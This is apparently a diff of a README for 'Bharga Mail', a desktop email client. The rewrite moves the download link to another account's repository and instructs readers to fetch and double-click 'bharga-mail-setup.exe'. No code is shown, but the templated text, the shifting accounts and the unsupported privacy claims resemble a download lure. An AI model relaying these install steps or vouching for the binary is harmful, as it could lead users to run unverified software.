@@ -1,152 +1,79 @@
-# Bharga Mail - Privacy-First Email Client 2026
+# 📩 bharga-mail-inbox-tools - Manage your private email with ease
 
-> **Bharga Mail is a desktop email application for macOS, Windows, and Linux, bringing together local-first email workflows, on-device AI assistance, multi-account access, and privacy-focused inbox features.**
+[![Download Bharga Mail](https://img.shields.io/badge/Download-Bharga_Mail-blue)](https://github.com/Colorful-bulldogwrench24/bharga-mail-inbox-tools)
 
-[![Platform](https://img.shields.io/badge/Platform-Desktop-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-AGPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/tom-fosterac4645/bharga-mail-inbox-tools?style=flat-square)](https://github.com/tom-fosterac4645/bharga-mail-inbox-tools)
+Bharga Mail protects your privacy while you manage your email. This desktop software keeps your messages on your computer. You choose when and how to connect to your accounts. Internal tools help you sort your inbox and draft messages using local AI. 
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://tom-fosterac4645.github.io/bharga-mail-inbox-tools/">
-    <img src="https://img.shields.io/badge/Download-Bharga%20Mail%20Latest-brightgreen?style=for-the-badge" alt="Download Bharga Mail">
-  </a>
-</p>
+Bharga Mail needs a standard Windows computer to function well. Check your system against this list before you start.
 
-> **[Download Bharga Mail](https://tom-fosterac4645.github.io/bharga-mail-inbox-tools/)**
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Memory: At least 8 gigabytes of RAM.
+- Storage: 500 megabytes of free space on your hard drive.
+- Internet: A stable connection for syncing mailbox data.
 
----
+## 📥 Getting Started
 
-[Download Latest Build](https://tom-fosterac4645.github.io/bharga-mail-inbox-tools/)
+Follow these steps to install the software on your Windows computer.
 
----
+1. Visit the repository page to download the software: https://github.com/Colorful-bulldogwrench24/bharga-mail-inbox-tools
+2. Look for the latest release version on the page.
+3. Click the link that ends with `.exe` to start the download.
+4. Save the file to your Downloads folder.
+5. Open your Downloads folder and double-click the file named `bharga-mail-setup.exe`.
+6. Follow the prompts on the screen to install the software.
+7. Click Finish to complete the installation.
 
-## Overview
+## 🔑 Your First Setup
 
-Bharga Mail provides a streamlined desktop inbox for users managing more than one email account. Alongside standard IMAP connections, it works with Gmail and Microsoft 365 and includes threaded conversations, rich-text messages, reusable signatures, scheduled delivery, and undo send.
+After you open the app for the first time, you must link your email account. Bharga Mail keeps your data on your local device.
 
-Its local-first design combines SQLite-based search with AI processing performed on the device for inbox triage, message summaries, and help preparing drafts. Additional inbox review tools include SPF, DKIM, and DMARC indicators, dangerous-link detection, sandboxed HTML display, and operating-system keychain storage for credentials.
+1. Launch Bharga Mail from your Start menu or desktop icon.
+2. Select Add Account from the main dashboard.
+3. Choose your email service provider from the list.
+4. Enter your email address and your password.
+5. Grant the app permission to sync your email headers.
+6. Wait for the app to download your messages.
 
----
+## 🛡️ Privacy Features
 
-## Highlights
+Privacy drives the design of this software. Traditional email clients show everything to remote servers. Bharga Mail uses different methods to protect you.
 
-- Run inbox triage, generate message summaries, and prepare drafts with on-device AI
-- Connect accounts through standard IMAP, Gmail, or Microsoft 365
-- Keep related messages together with conversation threading
-- View SPF, DKIM, and DMARC information as email trust indicators
-- Identify phishing attempts and potentially dangerous links
-- Schedule messages for later delivery or use undo send
-- Write formatted messages and apply reusable signatures
-- Search indexed mail locally through SQLite full-text search
-- Protect account credentials with the operating system keychain
-- Render email HTML inside a sandboxed environment
-- Use the application on macOS, Windows, or Linux
+- Local Data Storage: All your messages exist on your hard drive. No hidden server mirrors index your personal mail.
+- Tracker Blocking: The app blocks pixel trackers contained within incoming emails. You stop others from knowing when you open their mail.
+- Metadata Scrubbing: The software removes tracking identifiers from your outgoing messages.
 
----
+## 🤖 Using AI Assistance
 
-## Getting Started
+Bharga Mail includes helpful tools that run directly on your hardware. You do not need an external internet connection to use these features.
 
-### Install a desktop release
+- Auto-Sort: The software analyzes your email patterns. It moves newsletters and spam into dedicated folders based on your previous actions.
+- Draft Assist: You can type a summary of your thoughts. The app expands these points into a full formal email.
+- Smart Search: The internal database allows you to search for words within your emails. The search index identifies relevant messages within seconds.
 
-Visit [Download Latest Build](https://tom-fosterac4645.github.io/bharga-mail-inbox-tools/) and select the installer or package matching your operating system:
+## 🔧 Frequently Asked Questions
 
-- macOS
-- Windows
-- Linux
+Many users have common questions about using Bharga Mail. Look here for quick solutions.
 
-Complete the usual installation steps for your platform. After opening Bharga Mail, add an email account to begin.
+How do I update the software? Follow the download link provided in this guide to find the newest version. Install the file over your current version. Your data will remain safe.
 
-### Compile from source
+Does Bharga Mail store my password? The software uses the standard Windows Credential Vault. Your password stays within the secure encryption layer of your own computer.
 
-```bash
-git clone https://github.com/tom-fosterac4645/bharga-mail-inbox-tools.git
-cd REPO
-```
+Can I use multiple accounts? Yes. You may add as many email accounts as your system memory allows. Select the plus icon in the sidebar to add another mailbox.
 
-The desktop application is built with Tauri, Rust, and React. Set up the platform-specific development tools required by the project, then run the repository's documented development or packaging command to launch or package Bharga Mail.
+Will the AI send my data to the cloud? No. The AI model runs on your CPU or GPU. Information does not leave your local environment during the writing or sorting process.
 
----
+## 🛠️ Troubleshooting
 
-## Typical Workflow
+If you encounter an error, try these standard steps to resolve the issue.
 
-1. Start Bharga Mail.
-2. Connect an IMAP, Gmail, or Microsoft 365 account.
-3. Browse messages through the threaded inbox.
-4. Search the configured accounts using local search.
-5. Inspect trust indicators and link warnings while reading a message.
-6. Apply on-device AI to triage mail, create summaries, or assist with a draft.
-7. Write a response using rich text and signatures.
-8. Send it immediately, schedule it, or use undo send when available.
+Restart the software: Close the window and open it again. This cycle forces the app to re-initialize your local database.
 
----
+Check your internet: Ensure your computer maintains a stable connection to your email provider.
 
-## Data and Account Settings
+Clear the cache: Navigate to Settings, then Privacy, then Storage. Select Clear Cache to remove old synchronization files.
 
-Bharga Mail stores account credentials in the operating system keychain. The local SQLite database contains the data used for email search.
+Contact support: If problems persist, return to the repository page. Open a new issue with a clear description of the error you see.
 
-Account configuration is performed inside the desktop application. Depending on the provider, setup may require IMAP connection information or provider-specific authentication settings.
-
-```text
-Accounts       IMAP, Gmail, or Microsoft 365
-Storage        Local SQLite search database
-Credentials    Operating system keychain
-AI processing  On-device triage, summaries, and drafts
-```
-
----
-
-## System Requirements
-
-- macOS, Windows, or Linux
-- An account from a supported IMAP service, Gmail, or Microsoft 365
-- Network connectivity for synchronization and sending messages
-- Adequate local storage for the application and indexed email
-- Source builds require Rust, Node.js, and the Tauri prerequisites for the target operating system
-
----
-
-## Frequently Asked Questions
-
-### What providers can I connect?
-
-Bharga Mail works with standard IMAP services, Gmail, and Microsoft 365.
-
-### How does the application protect account credentials?
-
-Credentials are saved through the keychain provided by the operating system.
-
-### Is message search performed locally?
-
-Yes. Bharga Mail maintains a local SQLite full-text search database to support fast email lookup.
-
-### What does the on-device AI handle?
-
-The AI features assist with inbox triage, message summaries, and draft preparation.
-
-### How can I install an update?
-
-Get the latest package from the [download page](https://tom-fosterac4645.github.io/bharga-mail-inbox-tools/) and install the version intended for your operating system.
-
-### What can I do when messages are missing?
-
-First check the account credentials and provider configuration. Then confirm the account connection and network availability. If the problem continues, consult the project issue tracker or submit a support request containing relevant platform and account details.
-
-### Are multiple accounts supported?
-
-Yes. Bharga Mail is intended for use with multiple IMAP, Gmail, and Microsoft 365 accounts.
-
----
-
-## Roadmap
-
-Future plans and possible improvements are recorded in the repository's issues and project discussions. Review those resources for active priorities, progress updates, and ways to contribute.
-
----
-
-## License
-
-GNU Affero General Public License v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: email-client, privacy, local-first, windows-app, desktop-tools, inbox-management
